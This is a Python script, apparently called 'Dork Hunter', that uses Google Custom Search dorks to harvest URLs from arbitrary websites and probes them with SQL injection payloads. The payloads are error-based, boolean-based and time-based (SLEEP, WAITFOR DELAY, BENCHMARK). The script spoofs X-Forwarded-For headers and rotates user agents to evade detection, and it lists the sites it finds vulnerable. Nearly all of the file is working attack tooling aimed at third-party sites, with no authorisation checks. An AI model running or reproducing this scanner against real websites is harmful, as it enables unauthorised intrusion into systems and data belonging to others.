import os
import random
import re
import time
import ssl
import logging
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context
from urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import csv
from typing import List, Set, Dict, Optional
from urllib3.util.ssl_ import create_urllib3_context
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

DEFAULT_SCANNED_URLS_FILE = 'scanned_urls.txt'
DEFAULT_USER_AGENT_FILE = 'user_agents.txt'
DEFAULT_PAYLOADS_FILE = 'payloads.txt'
DEFAULT_REPORT_FILE = 'report.csv'
DEFAULT_LOG_FILE = 'scanner.log'
MAX_VULNERABLE_URLS = 10
MAX_SEARCH_RESULTS = 100
REQUEST_TIMEOUT = (10, 20)
DELAY_BETWEEN_REQUESTS = (1, 3)
CONSECUTIVE_TIMEOUT_THRESHOLD = 2
MAX_API_PAGES = 10  # Google allows maximum 100 results (10 pages)

# Enhanced SQL error patterns
SQL_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"Unclosed quotation mark",
    r"Syntax error.*sql",
    r"ORA-\d{5}",
    r"PostgreSQL.*ERROR",
    r"Microsoft SQL Server.*Error",
    r"DB2 SQL error"
]

# Setup logging - only log to file, not console
logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(DEFAULT_LOG_FILE)
    ]
)
logger = logging.getLogger(__name__)
logger.propagate = False

class CustomSSLAdapter(HTTPAdapter):
    
    def __init__(self, *args, **kwargs):
        self.ssl_context = create_urllib3_context()
        self.ssl_context.options |= ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3
        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
        if hasattr(ssl.TLSVersion, "TLSv1_3"):
            self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3

        
        try:
            self.ssl_context.options |= ssl.OP_NO_COMPRESSION
        except Exception:
            pass
        try:
            self.ssl_context.set_ciphers(
                "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:"
                "TLS_AES_128_GCM_SHA256:ECDHE+AESGCM:!SHA1:!MD5:!DES:!3DES:!RC4"
            )
        except Exception:
            pass

        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs["ssl_context"] = self.ssl_context
        return super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs["ssl_context"] = self.ssl_context
        return super().proxy_manager_for(*args, **kwargs)



class SqlScan:
    def __init__(self, api_key: str, cse_id: str):
        self.api_key = api_key
        self.cse_id = cse_id
        self.results = {
            'vulnerable': [],
            'not_vulnerable': [],
            'skipped': [],
            'errors': []
        }
        self.scanned_urls = set()
        self.user_agents = []
        self.payloads = []
        self.session = self._configure_session()
        self.initialize_components()
        self.verbose = False
        self.quiet_mode = False

    def _configure_session(self):
        session = requests.Session()

        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=frozenset(["HEAD", "GET", "OPTIONS"])
        )
    
        tls_adapter = CustomSSLAdapter(max_retries=retry_strategy)
    
        session.mount("https://", tls_adapter)
        session.mount("http://", HTTPAdapter(max_retries=retry_strategy))
    
        return session

    def initialize_components(self):
        """Load all required components"""
        self.scanned_urls = self.load_scanned_urls(DEFAULT_SCANNED_URLS_FILE)
        self.user_agents = self.load_file(DEFAULT_USER_AGENT_FILE)
        self.payloads = self.load_file(DEFAULT_PAYLOADS_FILE)
        
        if not self.user_agents:
            self.user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15"
            ]
            
        if not self.payloads:
            self.payloads = [
                "'",
                "' OR '1'='1",
                "' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--",
                "' OR EXISTS(SELECT 1 FROM information_schema.tables)--",
                "' WAITFOR DELAY '0:0:5'--"
            ]

    def load_file(self, file_path: str) -> List[str]:
        """Load a file line by line"""
        if not os.path.exists(file_path):
            logger.warning(f"File not found: {file_path}")
            return []
            
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]

    def load_scanned_urls(self, scanned_urls_file: str) -> Set[str]:
        """Load previously scanned URLs"""
        if os.path.exists(scanned_urls_file):
            with open(scanned_urls_file, 'r') as f:
                return {line.strip() for line in f}
        return set()

    def save_scanned_url(self, url: str, scanned_urls_file: str):
        """Save a URL to the scanned list"""
        with open(scanned_urls_file, 'a') as f:
            f.write(url + '\n')

    def get_random_headers(self):
        """Generate realistic browser headers"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Forwarded-For': self._generate_random_ip(),
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

    def _generate_random_ip(self) -> str:
        """Generate random IP for header rotation"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

    def dorking(self, dork: str, max_page: int) -> List[str]:
        """Search Google for dorks with proper pagination handling"""
        search_url = "https://www.googleapis.com/customsearch/v1"
        urls = []
        max_allowed_start = 90  # Google allows maximum start=90 (10 results per page * 10 pages)
        
        for start in range(1, min(max_page * 10, max_allowed_start + 1), 10):
            params = {
                'q': dork,
                'key': self.api_key,
                'cx': self.cse_id,
                'start': start,
                'num': 10
            }
            
            try:
                response = self.session.get(
                    search_url,
                    headers=self.get_random_headers(),
                    params=params,
                    timeout=REQUEST_TIMEOUT
                )
                response.raise_for_status()
                
                data = response.json()
                if 'items' not in data:
                    break
                    
                urls.extend(item['link'] for item in data.get('items', []))
                time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))
                
            except requests.exceptions.HTTPError as e:
                if response.status_code == 400 and start > 90:
                    logger.warning("Reached maximum allowed results (100)")
                    break
                logger.error(f"Search API error: {e}")
                break
            except requests.exceptions.RequestException as e:
                logger.error(f"Search API error: {e}")
                break
                
        return urls

    def extract_valid_urls(self, urls: List[str]) -> List[str]:
        """Filter URLs with SQLi parameters"""
        valid_urls = []
        for url in urls:
            if url in self.scanned_urls:
                continue
            if self.is_valid_url(url):
                valid_urls.append(url)
        return valid_urls

    def is_valid_url(self, url: str) -> bool:
        """Check if URL has SQLi-prone parameters"""
        try:
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            
            sql_params = [
                'id', 'item', 'product', 'user', 'uid', 'pid', 
                'page', 'category', 'order', 'search', 'filter'
            ]
            
            return any(p in query for p in sql_params)
        except Exception:
            return False

    def test_connection(self, url: str) -> bool:
        """Verify we can reach the target"""
        try:
            response = self.session.head(
                url,
                headers=self.get_random_headers(),
                timeout=10,
                allow_redirects=False
            )
            return response.status_code < 400
        except Exception:
            return False

    def check_vulnerability(self, url: str) -> Optional[bool]:
        """Enhanced vulnerability checking"""
        try:
            if not self.test_connection(url):
                logger.warning(f"Connection failed to {url}")
                return None
                
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            
            if not query:
                return None
                
            param = list(query.keys())[0]
            
            # First check if parameters are dynamic
            if not self._is_parameter_dynamic(url, param):
                return False
                
            # Then test with payloads
            return self._test_payloads(url, parsed, query)
            
        except Exception as e:
            logger.error(f"Error checking {url}: {e}")
            return None

    def _is_parameter_dynamic(self, url: str, param: str) -> bool:
        """Check if parameter affects output"""
        try:
            # Test with original value
            original = self._make_request(url)
            if original is None:
                return False
                
            # Test with altered value
            altered = self._make_request(f"{url}&{param}=xyz123")
            if altered is None:
                return False
                
            # Compare responses
            return original != altered
            
        except Exception:
            return False

    
    def _make_request(self, url: str) -> Optional[str]:
        try:
            response = self.session.get(
                url,
                headers=self.get_random_headers(),
                timeout=REQUEST_TIMEOUT,
                allow_redirects=False,
                verify=True
            )
            return response.text
        except Exception:
            return None

    
    def _make_request_with_ssl_fallback(self, url: str) -> Optional[str]:
        try:
            ctx = ssl.create_default_context()
            ctx.minimum_version = ssl.TLSVersion.TLSv1_2
            if hasattr(ssl.TLSVersion, "TLSv1_3"):
                ctx.maximum_version = ssl.TLSVersion.TLSv1_3
            try:
                ctx.options |= ssl.OP_NO_COMPRESSION
            except Exception:
                pass
    
            response = self.session.get(
                url,
                headers=self.get_random_headers(),
                timeout=15,
                verify=True,
                ssl_context=ctx
            )
            return response.text
        except Exception:
            return None

    def _test_payloads(self, url: str, parsed, query) -> bool:
        """Test all payloads against the URL"""
        for param, values in query.items():
            for value in values:
                for payload in self.payloads:
                    try:
                        # Build test URL
                        test_url = self._build_test_url(parsed, param, value, payload)
                        
                        # Make request with anti-bot headers
                        response = self._make_request(test_url)
                        if response is None:
                            continue
                            
                        # Check for SQL errors
                        if self._detect_sql_errors(response):
                            return True
                            
                        # Check for boolean-based differences
                        if self._check_boolean_based(url, param):
                            return True
                            
                        # Check for time-based delays
                        if self._check_time_based(url, param):
                            return True
                            
                    except Exception:
                        continue
                        
        return False

    def _build_test_url(self, parsed, param, value, payload) -> str:
        """Build URL with injected payload"""
        query = parse_qs(parsed.query)
        query[param] = [value + payload]
        new_query = urlencode(query, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _detect_sql_errors(self, response_text: str) -> bool:
        """Check for SQL errors using regex patterns"""
        if not response_text:
            return False
            
        text = response_text.lower()
        return any(re.search(pattern, text) for pattern in SQL_ERROR_PATTERNS)

    def _check_boolean_based(self, url: str, param: str) -> bool:
        """Check for boolean-based SQLi"""
        true_payloads = [
            f"{param}=1' AND '1'='1",
            f"{param}=1' OR '1'='1",
            f"{param}=1 AND 1=1"
        ]
        
        false_payloads = [
            f"{param}=1' AND '1'='2",
            f"{param}=1' OR '1'='2", 
            f"{param}=1 AND 1=2"
        ]

        base_response = self._make_request(url)
        if not base_response:
            return False

        for true_payload in true_payloads:
            true_url = f"{url}&{true_payload}"
            true_response = self._make_request(true_url)
            if not true_response:
                continue
                
            for false_payload in false_payloads:
                false_url = f"{url}&{false_payload}"
                false_response = self._make_request(false_url)
                if not false_response:
                    continue
                    
                # Significant difference means likely vulnerable
                if self._calculate_difference(base_response, true_response, false_response):
                    return True
        return False

    def _calculate_difference(self, base: str, true_resp: str, false_resp: str) -> bool:
        """Calculate response differences"""
        # Simple length difference check
        if abs(len(true_resp) - len(false_resp)) > 100:
            return True
            
        # Content comparison
        from difflib import SequenceMatcher
        true_diff = SequenceMatcher(None, base, true_resp).ratio()
        false_diff = SequenceMatcher(None, base, false_resp).ratio()
        
        return abs(true_diff - false_diff) > 0.3

    def _check_time_based(self, url: str, param: str) -> bool:
        """Check for time delays"""
        payloads = [
            f"{param}=1' AND (SELECT * FROM (SELECT(SLEEP(5)))--",
            f"{param}=1' WAITFOR DELAY '0:0:5'--",
            f"{param}=1 AND BENCHMARK(5000000,MD5(NOW()))"
        ]
        
        threshold = 4  # seconds
        
        for payload in payloads:
            start_time = time.time()
            self._make_request(f"{url}&{payload}")
            elapsed = time.time() - start_time
            
            if elapsed >= threshold:
                return True
                
        return False

    def find_vulnerable_urls(self, dork: str, max_vulnerable: int) -> List[str]:
        """Main scanning method with clean output"""
        vulnerable_urls = []
        page = 1
    
        print(f"\n{'='*50}")
        print(f"Starting scan for dork: {dork}")
        print(f"{'='*50}\n")

        while len(vulnerable_urls) < max_vulnerable and page <= MAX_API_PAGES:
            print(f"[*] Processing page {page}...", end='\r')
        
            urls = self.dorking(dork, page)
            if not urls:
                print("\n[!] No more results from search engine")
                break
        
            valid_urls = self.extract_valid_urls(urls)
            if not valid_urls:
                page += 1
                continue
        
            with ThreadPoolExecutor(max_workers=5) as executor:
                results = list(executor.map(self.check_vulnerability, valid_urls))
        
            for url, result in zip(valid_urls, results):
                if result is True:
                    vulnerable_urls.append(url)
                    print(f"\n[+] VULNERABLE: {url}")
                elif result is None:
                    print(f"\n[-] SKIPPED: {url}")
            
                if len(vulnerable_urls) >= max_vulnerable:
                    break
        
            page += 1
            time.sleep(random.uniform(*DELAY_BETWEEN_REQUESTS))

        print(f"\n{'='*50}")
        print(f"Scan completed. Found {len(vulnerable_urls)} vulnerable URLs")
        print(f"{'='*50}\n")
        return vulnerable_urls

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def center_text(text: str) -> str:
    try:
        terminal_width = os.get_terminal_size().columns
    except:
        terminal_width = 80
    lines = text.split('\n')
    centered_lines = [line.strip().center(terminal_width) for line in lines]
    return '\n'.join(centered_lines)

def get_api_credentials():
    clear_console()
    text1 = (
        " ██████╗  ██████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗\n"
        "██╔══██╗██╔═══██╗██╔══██╗██║ ██╔╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗\n"
        "██║  ██║██║   ██║██████╔╝█████╔╝     ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝\n"
        "██║  ██║██║   ██║██╔══██╗██╔═██╗     ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗\n"
        "██████╔╝╚██████╔╝██║  ██║██║  ██╗    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║\n"
        "╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝\n"
        "	\n"
        "██████╗ ██╗   ██╗    ██╗  ██╗███████╗███╗   ██╗██╗  ██╗\n"	
        "██╔══██╗╚██╗ ██╔╝    ╚██╗██╔╝██╔════╝████╗  ██║╚██╗██╔╝ \n"	
        "██████╔╝ ╚████╔╝      ╚███╔╝ █████╗  ██╔██╗ ██║ ╚███╔╝ \n"	
        "██╔══██╗  ╚██╔╝       ██╔██╗ ██╔══╝  ██║╚██╗██║ ██╔██╗ \n"	
        "██████╔╝   ██║       ██╔╝ ██╗██║     ██║ ╚████║██╔╝ ██╗\n"	
        "╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═══╝╚═╝  ╚═╝\n"
    )
    text2 = "Before using the tool, you must provide your Google Custom Search API key and Custom Search Engine ID."
    print(center_text(text1))
    print(center_text(text2))
    api_key = input("\nYour Google Custom Search API key: ").strip()
    cse_id = input("Your Google Custom Search Engine ID: ").strip()
    return api_key, cse_id

def get_dork_and_options():
    dork = input('Dork (example="inurl:product?id="): ').strip()
    max_vuln = input('Max Vulnerable URLs to find (Number, default 10): ').strip()
    max_vuln = int(max_vuln) if max_vuln.isdigit() else 10
    save_report = input("Save results to file? (Y/N): ").strip().lower() == 'y'
    return dork, max_vuln, save_report

def write_report(vulnerable_urls: List[str], filename: str = DEFAULT_REPORT_FILE):
    with open(filename, 'w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["Vulnerable URLs"])
        writer.writerows([[url] for url in vulnerable_urls])

def main():
    try:
        api_key, cse_id = get_api_credentials()
        scanner = SqlScan(api_key, cse_id)
        
        while True:
            dork, max_vuln, save_report = get_dork_and_options()
            clear_console()
            print("[*] Scanning started...\n")
            
            vulnerable_urls = scanner.find_vulnerable_urls(dork, max_vuln)
            
            if vulnerable_urls:
                print("\n[+] Vulnerable URLs found:")
                for i, url in enumerate(vulnerable_urls, 1):
                    print(f"{i}. {url}")
                
                if save_report:
                    write_report(vulnerable_urls)
                    print(f"\n[*] Results saved to {DEFAULT_REPORT_FILE}")
            else:
                print("\n[-] No vulnerable URLs found")
                
            choice = input("\n[?] Run another scan? (y/n): ").lower()
            if choice != 'y':
                print("\n[*] Exiting. Goodbye!")
                break
                
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")

if __name__ == "__main__":
    main()
